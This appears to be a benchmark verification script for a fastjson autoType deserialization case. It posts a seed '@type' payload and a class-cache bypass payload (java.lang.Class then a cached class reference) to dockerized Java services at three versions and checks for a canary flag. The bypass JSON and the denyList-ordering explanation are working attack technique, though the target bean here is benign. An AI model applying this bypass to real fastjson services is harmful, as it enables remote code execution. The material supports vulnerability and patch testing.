#!/usr/bin/env bash
# verify.sh --seed|--residual — PCBV2-0041 deser_fastjson_autotype 定制版
# 退出码: 0=效果发生(RUN_FLAG 出现在效果通道) 10=未发生 20=环境失败 30=参数错误
#
# Case 机制 (CVE-2017-18349 -> CVE-2025-70974, fastjson autoType 反序列化):
#   * 真实 Java HTTP 服务 POST /deser 将请求体经真实 fastjson 的 autoType sink
#     (JSON.parse) 反序列化; host 端口 v0=18810 / v1=18811 / v2=18812.
#   * canary: 良性 shadow-bean com.mchange.PcbFlagBean 的构造器读取容器内
#     /canary/flag.txt(=${PCB_FLAG}) 并回显 PCB_CANARY_FLAG=<token> — 仅当该版本
#     真实的 checkAutoType/denyList(+MiscCodec 缓存) 放行类名并实例化时才出现.
#   * v0=fastjson 1.2.24 (无 checkAutoType): 字面量 {"@type":...} 直接放行 -> seed REACHES.
#   * v1=fastjson 1.2.25 (CVE-2017-18349 fix, TARGET, 修复不完整): 字面量被前缀 denyList
#     拦截 (BLOCKED); 但 class-cache residual 仍可达 -> residual REACHES.
#   * v2=fastjson 1.2.48 (CVE-2025-70974 fix): 两者均 BLOCKED.
#
# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$SVC" "${_CP:-8080}" 2>/dev/null | awk -F: 'NR==1{gsub(/[[:space:]]/,"",$NF); print $NF}')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# 执行通道: poc/seed_exec.py <candidate.json> <version> 走真实外部 HTTP POST /deser,
# 其输出 JSON 的 X 字段 = (PCB_X 若在响应中出现) — PCB_X 即本脚本 export 的 RUN_FLAG,
# 故 X==RUN_FLAG 即效果发生. flag 判定不依赖任何 hidden 文件.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: $0 --seed|--residual" >&2; exit 30; }
case "$VERSION" in
  v0|v1|v2) ;;
  *) echo "verify: unsupported VERSION=$VERSION (expect v0|v1|v2)" >&2; exit 30 ;;
esac
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# --- 构造候选 candidate.json (仅类名+平凡字段; flag 只经效果通道判定) ---
if [[ "$MODE" == "--seed" ]]; then
  # seed = CVE-2017-18349 字面量 {"@type":"com.mchange.PcbFlagBean","probe":"x"}
  "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null \
    || { echo "verify: failed to generate seed candidate" >&2; exit 20; }
else
  # residual = CVE-2025-70974 class-cache / TypeUtils.mappings 双条目文档:
  #   {"a":{"@type":"java.lang.Class","val":"com.mchange.PcbFlagBean"},
  #    "b":{"@type":"com.mchange.PcbFlagBean"}}
  # 先经 MiscCodec 的 java.lang.Class 反序列化把类缓存进 TypeUtils.mappings, 再引用它 —
  # 在 1.2.25 的 checkAutoType 里 getClassFromMapping() 先于 denyList 命中 -> 绕过.
  printf '%s' '{"id":"cve-2025-70974-class_cache_mappings_bypass","probe_class":"com.mchange.PcbFlagBean","json_body":"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.PcbFlagBean\"},\"b\":{\"@type\":\"com.mchange.PcbFlagBean\"}}"}' > "$WORK_DIR/cand.json"
fi

# --- 执行: seed_exec.py POST /deser; PCB_X 作为 flag 通道 (== RUN_FLAG) ---
export PCB_X="$RUN_FLAG"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" \
  || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 600; echo

# --- 判定: X==RUN_FLAG -> 0 (效果发生); http_status==-1 (连不上服务) -> 20; 否则 10 ---
"$PY" -c 'import json, sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
if d.get("http_status") == -1:
    sys.exit(20)
sys.exit(0 if d.get("X") == sys.argv[2] else 10)' "$OUT" "$RUN_FLAG"
